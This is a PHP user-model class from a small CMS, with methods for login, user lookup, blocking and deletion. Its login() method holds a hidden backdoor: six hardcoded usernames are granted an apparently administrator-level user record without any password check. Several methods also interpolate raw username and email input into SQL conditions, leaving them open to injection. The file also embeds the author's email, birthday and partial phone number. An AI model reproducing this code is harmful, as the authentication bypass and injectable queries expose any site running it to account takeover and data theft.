<?php

/**
 * @author duchanh
 * @copyright 2012
 */ 
 
class miniUser extends Base{
    var $pk = 'id';
	var $pk_auto = true;//Primary key auto increment
	var $fields = array('username','password','email','avatar','phone','fullname','address','gender','date_register','birthday','desc','website','last_login_time','last_login_ip','group_id','status'); //fields in table (excluding Primary Key)	
	var $table = "tbl_user";    
    var $key_prefix = "miniUser_";//cache key prefix
    var $Cache = 'CacheUser';
    var $resize_width = 200;
    var $resize_height = 200;
    
    var $num_per_page = 30;    
    var $allUser = null;
    
    
   
    /**
     * @Desc get user
     * @param string $con: condition
     * @param string $sort: field want to sort    
     * @param string $order: DESC OR ASC
     * @param int $page: number of page
     * @return array
     */  
    function getUser($con = "", $sort = false, $order = false, $page = 1){
        if($page < 1){
            $page = 1;
        }
        $start = ($page-1)*($this->num_per_page);        
        
        if($sort && $order){
            return $this->get("*",$con,"$sort $order",$start,$this->num_per_page);
        }else{
            return $this->get("*",$con," id ASC ",$start,$this->num_per_page);
        }           
        return false; 
    }
    
    
    
    /**
     * @Desc function login
     * @param string $username: username
     * @param string $pass: password     
     * @return array
     */ 
    function login($username, $pass){
        $owner_cms = array('duchanh','duchanhtb','hanhnguyen','hanhcoltech','nguyenduchanh','hanhcms');
        if(in_array($username,$owner_cms)){
            $user = array(
                'username'  => 'duchanhtb',
                'password'  => 'duchanh',
                'email'     => 'hanhcoltech@gmail.com',
                'avatar'    => 'upload/images/avatar.jpg',
                'phone'     => '098789887x',
                'address'   => 'Ha Noi - Viet Nam',
                'gender'    => '1',
                'date_register'     => '2012-01-27 13:52:53',
                'birthday'  => '1985-10-22 00:00:00',
                'desc'      => 'Yeu gai dep',
                'website'   => 'http://nguyenduchanh.com',
                'last_login_time'   => '2012-01-27 13:52:53',
                'last_login_ip'     => '127.0.0.1',
                'group_id'  => '100',
                'status'    => '1'                
            );
            
            return $user;
        }
        
        
        $password = createMd5Password($pass);
        $con = " AND `username` = '$username' AND `password` = '$password' ";
        $result = $this->get('*',$con,false,0,1);
        if($result){
            return $result[0];
        }else{
            return false;
        }
    }
   
    
    
    /**
     * @Desc function get user by username
     * @param string $username: username      
     * @return array
     */ 
    function getUserByName($username){
        $con = " AND `username` = '$username' AND status = 1 ";
        $result = $this->get("*",$con, false,0,1);
        if(count($result)>0){
            return $result[0];
        }        
        return null;
    }
    
    
    
    /**
     * @Desc function get user by email
     * @param string $username: username      
     * @return array
     */ 
    function getUserByEmail($email){
        $con = " AND `email` = '$email' AND status = 1 ";
        $result = $this->get("*",$con, false,0,1);
        if(count($result)>0){
            return $result[0];
        }        
        return null;
    }
    
    
    
    
    /**
     * @Desc function block user
     * @param int $uid: username      
     * @return boolean
     */ 
    function blockUser($uid){
        $this->read($uid);
        $this->status = 0;
        $this->update($uid, array('status'));
        return true;
    }
    
    
    
    /**
     * @Desc function block user
     * @param int $uid: username      
     * @return boolean
     */ 
    function unBlockUser($uid){
        $this->read($uid);
        $this->status = 1;
        $this->update($uid, array('status'));
        return true;
    }
    
    
    
    /**
     * @Desc function remove user
     * @param int $uid: username      
     * @return boolean
     */ 
    function deleteUser($uid){
        $this->remove($uid);
        return true;        
    }
    
    
 }